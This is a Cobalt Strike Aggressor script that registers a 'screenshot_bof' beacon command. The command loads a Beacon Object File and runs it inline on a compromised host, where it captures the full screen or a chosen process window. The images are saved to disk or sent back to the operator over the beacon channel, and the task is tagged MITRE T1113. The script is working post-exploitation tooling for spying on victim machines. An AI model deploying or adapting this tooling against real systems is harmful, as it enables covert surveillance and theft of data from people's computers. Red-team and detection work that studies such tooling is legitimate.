
#Register command
beacon_command_register(
    "screenshot_bof",
    "Alternative screenshot capability that does not do fork n run",
    "Use: screenshot_bof [filename] [save method] [PID] [grayscale(0/1)=0] [quality 0-100=90]\n- PID 0 captures full screen\n- Save methods: 0 drop to disk, 1 download file, 2 download screenshot\n- Grayscale/quality optional; defaults applied when omitted\n\nTake a screenshot inline using a BOF. Screenshot is saved as JPEG on disk or downloaded over beacon."
);

alias screenshot_bof {
    local('$bid $barch $handle $data $args $target_pid');
    $bid = $1;
    # figure out the arch of this session
    $barch  = barch($bid);
    if (size(@_) < 4 || size(@_) > 6)
    {
        berror($1, "Syntax: screenshot_bof [filename] [save method 0/1/2] [PID] [grayscale(0/1)=0] [quality 0-100=90]\nNote: set PID to 0 to capture full screen.");
        return;
    }
    # read in the right BOF file
    $handle = openf(script_resource("ScreenshotBOF. $+ $barch $+ .obj"));
    $data = readb($handle, -1);
    closef($handle);
    
    # FEATURE PUT ON HOLD DUE TO STABILITY
    # figure out if the profile chooses to chunk the post or not (getOnlyProfile)
    # $profile = data_query("metadata")["c2profile"];
    # $getOnlyProfile = [$profile shouldChunkPosts];
    # println($getOnlyProfile);

    $grayscale = iff(size(@_) >= 5, $5, 0);
    $quality   = iff(size(@_) >= 6, $6, 90);

    $args   = bof_pack($bid, "ziiii", $2, $3, $4, $grayscale, $quality);

    # announce what we're doing
    btask($bid, "Running screenshot BOF by (@codex_tf2)", "T1113");
    # execute it.
    beacon_inline_execute($bid, $data, "go", $args);
}
